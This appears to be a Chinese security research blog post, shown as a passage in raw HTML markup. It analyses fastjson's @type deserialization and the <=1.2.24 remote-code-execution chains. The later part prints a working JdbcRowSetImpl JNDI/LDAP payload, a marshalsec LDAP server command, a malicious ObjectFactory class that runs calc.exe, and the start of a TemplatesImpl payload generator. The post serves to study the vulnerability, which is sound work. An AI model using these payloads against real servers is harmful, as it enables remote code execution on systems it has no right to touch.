</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name setter called"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name getter called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"age getter called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Object obj = JSON.parse(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        Object obj2 = JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>);</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        Object obj3 = JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>,FastJsonTest.class);</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JSON.parse("")</span></span><br><span class="line">name setter called</span><br><span class="line">com.fastjson.FastJsonTest@<span class="number">5</span>a2e4553</span><br><span class="line"><span class="comment">//JSON.parseObject("")</span></span><br><span class="line">name setter called</span><br><span class="line">age getter called</span><br><span class="line">name getter called</span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"thisisname"</span>,<span class="string">"age"</span>:<span class="string">"thisisage"</span>&#125;</span><br><span class="line"><span class="comment">//JSON.parseObject("",class)</span></span><br><span class="line">name setter called</span><br><span class="line">com.fastjson.FastJsonTest<span class="meta">@e</span>2144e4</span><br></pre></td></tr></table></figure></p>
<p>结论：</p>
<ul>
<li>parse(“”) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
<li>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li>
<li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li>
</ul>
<p>特定的setter和getter的调用都是在解析过程中的调用。（具体是哪些setter和getter会被调用，我们将在之后讲到）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae284qq65j31tz122wl9.jpg" alt="setter解析中执行.png"></p>
<p>之所以<strong>parseObject(“”)</strong>有区别就是因为<strong>parseObject(“”)</strong>比起其他方式多了一步<strong>toJSON</strong>操作，在这一步中会对所有getter进行调用。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27y570pj31va0ylted.jpg" alt="getter全调用.png"></p>
<h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>那么除开正常的序列化，反序列化。<br>fastjson提供特殊字符段<code>@type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set，get方法。</p>
<p>我们先来看一下这个字段的使用:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@使用特定修饰符，写入@type序列化</span></span><br><span class="line">String serializedStr1 = JSON.toJSONString(user1,SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(<span class="string">"serializedStr1="</span>+serializedStr1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过parse方法进行反序列化</span></span><br><span class="line">Object obj4 = JSON.parse(serializedStr1);</span><br><span class="line">System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj4.getClass().getName());</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化:"</span>+obj4);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过这种方式返回的是一个相应的类对象</span></span><br><span class="line">Object obj5 = JSON.parseObject(serializedStr1);</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj5.getClass().getName());</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化:"</span>+obj5);</span><br></pre></td></tr></table></figure></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">serializedStr1=&#123;<span class="string">"@type"</span>:<span class="string">"com.fastjson.User"</span>,<span class="string">"age"</span>:<span class="number">11</span>,<span class="string">"name"</span>:<span class="string">"lala"</span>&#125;</span><br><span class="line"><span class="comment">//parse反序列化</span></span><br><span class="line">parse反序列化对象名称:com.fastjson.User</span><br><span class="line">parseObject反序列化:com.fastjson.User@<span class="number">1</span>cf4f579</span><br><span class="line"><span class="comment">//parseObject反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这边在调试的时候，可以看到，本该解析出来的@type都没有解析出来</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27qrizoj30qk07yglz.jpg" alt="@type反序列化.png"></p>
<p>以上我们可以知道当@type输入的时候会特殊解析（不然的话会有@type：com.fastjson.User的键值对），那么自动调用其特定的set，get方法怎么说呢？</p>
<p>我们先建立一个序列化实验用的Person类</p>
<p><code>Person.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop;</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//set</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getSex()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProp()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//在输出时会自动调用的对象ToString函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">"[Person Object] name="</span> + <span class="keyword">this</span>.name + <span class="string">" full_name="</span> + <span class="keyword">this</span>.full_name  + <span class="string">", age="</span> + <span class="keyword">this</span>.age + <span class="string">", prop="</span> + <span class="keyword">this</span>.prop + <span class="string">", sex="</span> + <span class="keyword">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>@type反序列化实验：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">type</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String eneity3 = <span class="string">"&#123;\"@type\":\"com.fastjson.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": &#123;\"123\":123&#125;, \"sex\": 1&#125;"</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(eneity3,Person.class);</span><br><span class="line">        <span class="comment">//输出会调用obj对象的tooString函数</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=lala full_name=null, age=13, prop=null, sex=null</span><br><span class="line"></span><br><span class="line">public name 反序列化成功</span><br><span class="line">private full_name 反序列化失败</span><br><span class="line">private age setAge函数被调用</span><br><span class="line">private sex getsex函数没有被调用</span><br><span class="line">private prop getprop函数被成功调用</span><br></pre></td></tr></table></figure>
<p>可以得知：</p>
<ul>
<li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li>
<li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li>
</ul>
<p>决定这个set/get函数是否将被调用的代码最终在<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>函数处</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27is4imj31xh0rg7an.jpg" alt="解析set-get.png"></p>
<p>在进入build函数后会遍历一遍传入class的所有方法，去寻找满足set开头的特定类型方法；再遍历一遍所有方法去寻找get开头的特定类型的方法</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27eideej31sm0pw156.jpg" alt="set条件.png"></p>
<p><strong>set开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li>非静态方法</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>寻找到符合要求的set开头的方法后会根据一定规则提取方法名后的变量名（好像会过滤_，就是set_name这样的方法名中的下划线会被略过，得到name）。再去跟这个类的属性去比对有没有这个名称的属性。</p>
<p>如果没有这个属性并且这个set方法的输入是一个布尔型（是boolean类型，不是Boolean类型，这两个是不一样的），会重新给属性名前面加上<strong>is</strong>，再取头两个字符，第一个字符为大写（即isNa），去寻找这个属性名。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg" alt="get条件.png"></p>
<blockquote>
<p>这里的is就是有的网上有的文章中说反序列化会自动调用get、set、is方法的由来。个人觉得这种说法应该是错误的。</p>
<p>真实情况应该是确认存在符合setXxx方法后，会与这个方法绑定一个xxx属性，如果xxx属性不存在则会绑定isXx属性（这里is后第一个字符需要大写，才会被绑定）。并没有调用is开头的方法</p>
<p>自己从源码中分析或者尝试在类中添加isXx方法都是不会被调用的，这里只是为了指出其他文章中的一个错误。这个与调用的set方法绑定的属性，再之后并没有发现对于调用过程有什么影响。</p>
<p>所以只要目标类中有满足条件的set方法，然后得到的方法变量名存在于序列化字符串中，这个set方法就可以被调用。</p>
<p>如果有老哥确定是否可以调用is方法，可以联系我，非常感谢。</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26zr372j31w30ggtba.jpg" alt="get条件.png"></p>
<p><strong>get开头的方法要求如下：</strong></p>
<ul>
<li>方法名长度大于等于4        </li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无传入参数</li>
<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
</ul>
<p>所以我们上面例子中的getsex方法没有被调用是因为返回类型不符合，而getprop方法被成功调用是因为Properties 继承 Hashtable，而Hashtable实现了Map接口，返回类型符合条件。</p>
<p>再顺便看一下最后触发方法调用的地方com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue，（在被调用的方法中下断点即可）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26u6n7bj31ha0oxdia.jpg" alt="调用方法处.png"></p>
<p>那么至此我们可以知道</p>
<ul>
<li>@type可以指定反序列化成服务器上的任意类</li>
<li>然后服务端会解析这个类，提取出这个类中符合要求的setter方法与getter方法（如setxxx）</li>
<li>如果传入json字符串的键值中存在这个值（如xxx)，就会去调用执行对应的setter、getter方法（即setxxx方法、getxxx方法）</li>
</ul>
<blockquote>
<p>上面说到readObejct(“”)还会额外调用toJSON调用所有getter函数，可以不符合要求。</p>
</blockquote>
<p>看上去应该是挺正常的使用逻辑，反序列化需要调用对应参数的setter、getter方法来恢复数据。</p>
<p>但是在可以调用任意类的情况下，如果setter、getter方法中存在可以利用的情况，就会导致任意命令执行。</p>
<p>对应反序列化攻击利用三要素来说，以上我们就是找到了readObject复写点，下面来探讨反序列化利用链。</p>
<p>我们先来看最开始的漏洞版本是&lt;=1.2.24，在这个版本前是默认支持@type这个属性的。</p>
<h2 id="【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><a href="#【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl"></a>【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>JNDI注入利用链是通用性最强的利用方式，在以下三种反序列化中均可使用：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse(jsonStr)</span><br><span class="line">parseObject(jsonStr)</span><br><span class="line">parseObject(jsonStr,Object.class)</span><br></pre></td></tr></table></figure></p>
<p>当然JDK版本有特殊需求，在JNDI注入一文中已说过，这里就不再说明</p>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>在JNDI注入一文中我们已经介绍了利用链，把漏洞触发代码从</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String uri = <span class="string">"rmi://127.0.0.1:1099/aa"</span>;<span class="comment">//可控uri</span></span><br><span class="line">Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">ctx.lookup(uri);</span><br></pre></td></tr></table></figure>
<p>衍生到了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面尝试用fastjson的@type来使服务端执行以上代码，可以看到我们需要调用的两个函数都是以set开头！这说明我们可以把这个函数当作setter函数进行调用！</p>
<p>去看一下这两个函数接口符不符合setter函数的条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void setDataSourceName(String var1) throws SQLException</span><br><span class="line">public void setAutoCommit(boolean var1)throws SQLException</span><br></pre></td></tr></table></figure>
<ul>
<li style="list-style: none"><input type="checkbox" checked> 方法名长度大于4且以set开头，且第四个字母要是大写</li>
<li style="list-style: none"><input type="checkbox" checked> 非静态方法</li>
<li style="list-style: none"><input type="checkbox" checked> 返回类型为void或当前类</li>
<li style="list-style: none"><input type="checkbox" checked> 参数个数为1个</li>
</ul>
<p>完美符合！直接给出payload！</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    "@type":"com.sun.rowset.JdbcRowSetImpl",   //调用com.sun.rowset.JdbcRowSetImpl函数中的</span><br><span class="line">    "dataSourceName":"ldap://127.0.0.1:1389/Exploit",   // setdataSourceName函数 传入参数"ldap://127.0.0.1:1389/Exploit"</span><br><span class="line">    "autoCommit":true // 再调用setAutoCommit函数，传入true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>java环境：jdk1.8.0_161 &lt; 1.8u191 （可以使用ldap注入）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 版本<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.fastjson.User;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    String payload =   <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用工具起一个ldap服务</p>
<p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8090/#ExecTest</code></p>
<p>之前的ExecTest.class，也不用修改直接上来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在1.8下编译后使用python起web服务</p>
<p><code>py -3 -m http.server 8090</code></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae26iha62j322q127wut.jpg" alt="jndi计算器.png"></p>
<h2 id="【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链"><a href="#【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链" class="headerlink" title="【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链"></a>【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链</h2><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>基于<code>JDK1.7u21 Gadgets</code> 的触发点TemplatesImple的利用条件比较苛刻：</p>
<ol>
<li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li>
<li>服务端使用parse()时，需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li>
</ol>
<p>这是因为payload需要赋值的一些属性为private属性，服务端必须添加特性才回去从json中恢复private属性的数据</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae265y6ofj30ze0t676p.jpg" alt="private属性.png"></p>
<blockquote>
<p>对于 JDK1.7u21 Gadgets 不熟悉的同学，可以参考我之前的文章。</p>
<p>在之前的文章也说过，TemplatesImpl对应的整条利用链是只有在JDK1.7u21附近的版本才能使用，但是最后TemplatesImpl这个类的触发点，其实是1.7全版本通用的。（因为修复只砍在了中间环节AnnotationInvocationHandler类）</p>
<p>那么实际上fastjson正是只利用了最后的TemplatesImpl触发点。这个利用方式实际上是1.7版本通用的。<br>其利用局限性在于服务端反序列化json的语句必须要支持private属性。</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25r6kaij31zm0wotma.jpg" alt="1.7u21 TemplatesImpl链计算器.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae25jl1alj322s0xzh02.jpg" alt="1.7u80 TemplatesImpl链计算器.png"></p>
<p>在Github上传的项目中<code>版本24.jdk7u21.java</code>是网上的payload。需要自己编译生成一个class文件不是很方便。</p>
<p>在<code>版本24.jdk7u21_mine</code>中自己把7u21链的payload中拿过来，自己改了下，可以自动生成payload。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdk7u21_mine</span> </span>&#123;</span><br><span class="line">    <span class="comment">//最终执行payload的类的原始模型</span></span><br><span class="line">    <span class="comment">//ps.要payload在static模块中执行的话，原始模型需要用static方式。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">lala</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回一个在实例化过程中执行任意代码的恶意类的byte码</span></span><br><span class="line">    <span class="comment">//如果对于这部分生成原理不清楚，参考以前的文章</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getevilbyte() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.get(lala.class.getName());</span><br><span class="line">        <span class="comment">//要执行的最终命令</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line">        <span class="comment">//之前说的静态初始化块和构造方法均可，这边用静态方法</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="comment">//        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);</span></span><br><span class="line"><span class="comment">//        cons.setBody("&#123;"+cmd+"&#125;");</span></span><br><span class="line"><span class="comment">//        cc.addConstructor(cons);</span></span><br><span class="line">        <span 